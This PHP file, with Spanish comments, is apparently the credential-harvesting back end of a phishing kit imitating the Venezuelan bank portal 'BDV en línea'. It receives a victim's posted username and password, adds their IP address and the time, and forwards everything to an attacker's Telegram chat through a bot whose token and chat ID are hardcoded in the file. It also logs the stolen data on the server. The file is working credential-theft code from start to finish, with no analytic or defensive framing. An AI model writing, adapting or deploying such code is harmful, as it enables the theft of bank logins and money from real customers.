<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

// Log para verificar si el archivo se está ejecutando
error_log("send_data.php ejecutándose");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Log de los datos recibidos
    error_log("Datos POST recibidos: " . print_r($_POST, true));
    
    $usuario = $_POST['usuario'];
    $password = $_POST['password'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $fecha = date('Y-m-d H:i:s');

    $token = getenv('TELEGRAM_TOKEN') ?: "8080814760:AAFEZS3tJZHNg6zNbPh2JNFSLXNccRSElYQ";
    $chat_id = getenv('TELEGRAM_CHAT_ID') ?: "6912929677";
    
    $mensaje = urlencode("🏦 ═══ BDV EN LÍNEA ═══ 🏦\n\n👤 Usuario: $usuario\n🔑 Clave: $password\n🌐 IP: $ip\n📅 Fecha: $fecha");
    
    // Log antes de enviar a Telegram
    error_log("Intentando enviar a Telegram: " . $mensaje);
    
    $response = file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$mensaje");
    
    // Log de la respuesta de Telegram
    error_log("Respuesta de Telegram: " . $response);
    
    echo json_encode(["success" => true]);
} else {
    error_log("Método no permitido: " . $_SERVER['REQUEST_METHOD']);
    echo json_encode(["success" => false, "error" => "Método no permitido"]);
}
?> 